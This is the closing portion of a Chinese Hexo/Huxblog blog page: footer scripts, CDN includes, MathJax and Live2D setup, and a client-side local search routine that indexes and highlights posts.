  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
}
blog_live_time();
</script></div>
		</p>
		
      </div>
    </div>
  </div>
</footer>

<a id="rocket" href="#top" class=""></a>


  <!-- jQuery -->
  <script type="text/javascript" src="/js/jquery.min.js"></script>
  <!-- Bootstrap Core JavaScript -->
  <script type="text/javascript" src="/js/bootstrap.min.js"></script>
  <!-- Custom Theme JavaScript -->
  <script type="text/javascript" src="/js/hux-blog.min.js"></script>
  <!-- catalog -->
  <script async="true" type="text/javascript" src="/js/catalog.js"></script>
  <!-- totop(rocket) -->
  <script async="true" type="text/javascript" src="/js/totop.js"></script>

  
    <!-- Busuanzi JavaScript -->
    <script async="async" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  

  
    <!-- Scroll start -->
    <script async="async" type="text/javascript" src="/js/scroll.js"></script>
    <!-- Scroll end -->
  

  
    <!-- LangSelect start -->
    <script type="text/javascript" src="/js/langselect.js"></script>
    <!-- LangSelect end -->
  

  
    <!-- Mouseclick -->
    <script type="text/javascript" src="/js/mouseclick.js" content='' color=''></script>
  

  
    <!-- ribbon -->
    <script type="text/javascript" src="/js/ribbonDynamic.js"></script>
  

  
    <!-- Line start -->
    <script async="text/javascript" src="/js/line.js"></script>
    <!-- Line end -->
  






  <!-- viewer start -->
  <!-- viewer start (Picture preview) -->
  
    <script async="async" type="text/javascript" src="/js/viewer/viewer.min.js"></script>
    <script async="async" type="text/javascript" src="/js/viewer/pic-viewer.js"></script>
  

  <!-- viewer end -->


<script>
  // async load function
  function async (u, c) {
    var d = document,
      t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (c) {
      o.addEventListener('load', function (e) {
        c(null, e);
      }, false);
    }
    s.parentNode.insertBefore(o, s);
  }

  // fastClick.js
  async ("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function () {
    var $nav = document.querySelector("nav");
    if ($nav)
      FastClick.attach($nav);
    }
  )
</script>

<!-- Because of the native support for backtick-style fenced code blocks right within the Markdown is landed in Github Pages, From V1.6, There is no need for Highlight.js, so Huxblog drops it officially. -
https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0 - https://help.github.com/articles/creating-and-highlighting-code-blocks/ -->
<!-- <script> async ("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function () { hljs.initHighlightingOnLoad(); }) </script> <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet"> -->

<!-- jquery.tagcloud.js -->
<!-- <script> // only load tagcloud.js in tag.html if ($('#tag_cloud').length !== 0) { async ("https://morblog.cc/js/jquery.tagcloud.js", function () { $.fn.tagcloud.defaults = { // size: { start: 1, end: 1, unit: 'em' }, color: {
start: '#bbbbee', end: '#0085a1' } }; $('#tag_cloud a').tagcloud(); }) } </script> -->


		<!-- Search -->
		
		<div class="popup search-popup local-search-popup">
  <span class="popup-btn-close">
    ESC
  </span>
  <div class="container">
    <div class="row">
      <!-- <div class="col-md-9 col-md-offset-1"> -->
      <div class="col-lg-9 col-lg-offset-1 col-md-10 col-md-offset-1 local-search-content">

        <div class="local-search-header clearfix">

          <div class="local-search-input-wrapper">
            <span class="search-icon">
              <i class="fa fa-search fa-lg" style="margin: 25px 10px 25px 20px;"></i>
            </span>
            <input autocomplete="off" placeholder="搜索..." type="text" id="local-search-input">
          </div>
        </div>
        <div id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>


  
    <script src="/js/ziploader.js"></script>
  
  <script>
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.json";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    // monitor main search box;
    var onPopupClose = function (e) {
      $('.popup').fadeOut(300);
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $('.popup').fadeIn(300);
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }
    // get search zip version
    $.get('/searchVersion.json?t=' + (+new Date()), function (res) {
      if (localStorage.getItem('searchVersion') !== res) {
        localStorage.setItem('searchVersion', res);
        initSearchJson();
      }
    });

    function initSearchJson() {
      initLoad(['/search.flv'], {
        loadOptions: {
          success: function (obj) {
            localStorage.setItem('searchJson', obj['search.json'])
          },
          error: function (e) {
            return console.log(e)
          }
        },
        returnOptions: {
          'json': TYPE_TEXT
        },
        mimeOptions: {
          'json': 'application/json'
        }
      })
    }
    // search function;
    var searchFunc = function (search_id, content_id) {
      'use strict';
      isfetched = true;
      var datas = JSON.parse(localStorage.getItem('searchJson'));
      // console.log(search_id)
      var input = document.getElementById(search_id);
      var resultContent = document.getElementById(content_id);
      var inputEventFunction = function () {
        var searchText = input.value.trim().toLowerCase();
        var keywords = searchText.split(/[\s\-]+/);
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        var resultItems = [];
        if (searchText.length > 0) {
          // perform local searching
          datas.forEach(function (data) {
            var isMatch = false;
            var hitCount = 0;
            var searchTextCount = 0;
            var title = data.title
              ? data.title.trim()
              : '';
            var titleInLowerCase = title.toLowerCase();
            var content = data.content
              ? data.content.trim().replace(/<[^>]+>/g, "")
              : '';
            var contentInLowerCase = content.toLowerCase();
            var articleUrl = decodeURIComponent(data.url);

            var date = data.date;
            var dateTime = date.replace(/T/, " ").replace(/.000Z/, "");
            var imgUrl = data.header_img;
            


            var indexOfTitle = [];
            var indexOfContent = [];
            // only match articles with not empty titles
            keywords.forEach(function (keyword) {
              function getIndexByWord(word, text, caseSensitive) {
                var wordLen = word.length;
                if (wordLen === 0) {
                  return [];
                }
                var startPosition = 0,
                  position = [],
                  index = [];
                if (!caseSensitive) {
                  text = text.toLowerCase();
                  word = word.toLowerCase();
                }
                while ((position = text.indexOf(word, startPosition)) > -1) {
                  index.push({position: position, word: word});
                  startPosition = position + wordLen;
                }
                return index;
              }
              indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
              indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
            });
            if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
              isMatch = true;
              hitCount = indexOfTitle.length + indexOfContent.length;
            }
            // show search results
            if (isMatch) {
              // sort index by position of keyword
              [indexOfTitle, indexOfContent].forEach(function (index) {
                index.sort(function (itemLeft, itemRight) {
                  if (itemRight.position !== itemLeft.position) {
                    return itemRight.position - itemLeft.position;
                  } else {
                    return itemLeft.word.length - itemRight.word.length;
                  }
                });
              });
              // merge hits into slices
              function mergeIntoSlice(text, start, end, index) {
                var item = index[index.length - 1];
                var position = item.position;
                var word = item.word;
                var hits = [];
                var searchTextCountInSlice = 0;
                while (position + word.length <= end && index.length != 0) {
                  if (word === searchText) {
                    searchTextCountInSlice++;
                  }
                  hits.push({position: position, length: word.length});
                  var wordEnd = position + word.length;
                  // move to next position of hit
                  index.pop();
                  while (index.length != 0) {
                    item = index[index.length - 1];
                    position = item.position;
                    word = item.word;
                    if (wordEnd > position) {
                      index.pop();
                    } else {
                      break;
                    }
                  }
                }
                searchTextCount += searchTextCountInSlice;
                return {hits: hits, start: start, end: end, searchTextCount: searchTextCountInSlice};
              }
              var slicesOfTitle = [];
              if (indexOfTitle.length != 0) {
                slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
              }
              var slicesOfContent = [];
              while (indexOfContent.length != 0) {
                var item = indexOfContent[indexOfContent.length - 1];
                var position = item.position;
                var word = item.word;
                // cut out 100 characters
                var start = position - 20;
                var end = position + 80;
                if (start < 0) {
                  start = 0;
                }
                if (end < position + word.length) {
                  end = position + word.length;
                }
                if (end > content.length) {
                  end = content.length;
                }
                slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
              }
              // sort slices in content by search text's count and hits' count
              slicesOfContent.sort(function (sliceLeft, sliceRight) {
                if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                  return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                  return sliceRight.hits.length - sliceLeft.hits.length;
                } else {
                  return sliceLeft.start - sliceRight.start;
                }
              });
              // select top N slices in content
              var upperBound = parseInt('1');
              if (upperBound >= 0) {
                slicesOfContent = slicesOfContent.slice(0, upperBound);
              }
              // highlight title and content
              function highlightKeyword(text, slice) {
                var result = '';
                var prevEnd = slice.start;
                slice.hits.forEach(function (hit) {
                  result += text.substring(prevEnd, hit.position);
                  var end = hit.position + hit.length;
                  result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                  prevEnd = end;
                });
                result += text.substring(prevEnd, slice.end);
                return result;
              }
              var resultItem = '';

              // if (slicesOfTitle.length != 0) {   resultItem += "<li><a target='_blank' href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>"; } else {   resultItem += "<li><a target='_blank' href='" +
              // articleUrl + "' class='search-result-title'>" + title + "</a>"; } slicesOfContent.forEach(function (slice) {   resultItem += "<a target='_blank' href='" + articleUrl + "'><p class=\"search-result\">" + highlightKeyword(content, slice) +
              // "...</p></a>"; }); resultItem += "</li>";

              if (slicesOfTitle.length != 0) {
                resultItem += "<a target='_blank' href='" + articleUrl + "' class='search-result'><div class='search-result-left'><div class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</div><time class='search-result-date'>" + dateTime + "</time>";
              } else {
                resultItem += "<a target='_blank' href='" + articleUrl + "' class='search-result'><div class='search-result-left'><div class='search-result-title'>" + title + "</div><time class='search-result-date'>" + dateTime + "</time>";
              }
              slicesOfContent.forEach(function (slice) {
                resultItem += "<p class=\"search-result-content\">" + highlightKeyword(content, slice) + "...</p>";
              });
              resultItem += "</div><div class='search-result-right'><img class='media-image' src='" + imgUrl + "' width='64px' height='48px'></img></div></a>";

              resultItems.push({item: resultItem, searchTextCount: searchTextCount, hitCount: hitCount, id: resultItems.length});
            }
          })
        };

        if (keywords.length === 1 && keywords[0] === "") {
          resultContent.innerHTML = '<div id="no-result"></div>'
        } else if (resultItems.length === 0) {
          resultContent.innerHTML = '<div id="no-result"></div>'
        } else {
          resultItems.sort(function (resultLeft, resultRight) {
            if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
              return resultRight.searchTextCount - resultLeft.searchTextCount;
            } else if (resultLeft.hitCount !== resultRight.hitCount) {
              return resultRight.hitCount - resultLeft.hitCount;
            } else {
              return resultRight.id - resultLeft.id;
            }
          });
          var searchResultList = '<div class=\"search-result-list\">';
          resultItems.forEach(function (result) {
            searchResultList += result.item;
          })
          searchResultList += "</div>";
          resultContent.innerHTML = searchResultList;
        }
      }
      if ('auto' === 'auto') {
        input.addEventListener('input', inputEventFunction);
      } else {
        $('.search-icon').click(inputEventFunction);
        input.addEventListener('keypress', function (event) {
          if (event.keyCode === 13) {
            inputEventFunction();
          }
        });
      }
      // remove loading animation
      $('body').css('overflow', '');
      proceedsearch();
    }
    // handle and trigger popup window;
    $('.popup-trigger').click(function (e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc('local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });
    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function (e) {
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 && $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });

    document.addEventListener('mouseup', (e) => {
      var _con = document.querySelector(".local-search-content");
      if (_con) {
        if (!_con.contains(e.target)) {
          onPopupClose();
        }
      }
    });
  </script>


		
	<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haru02.model.json"},"display":{"position":"right","width":225,"height":225,"right":125},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
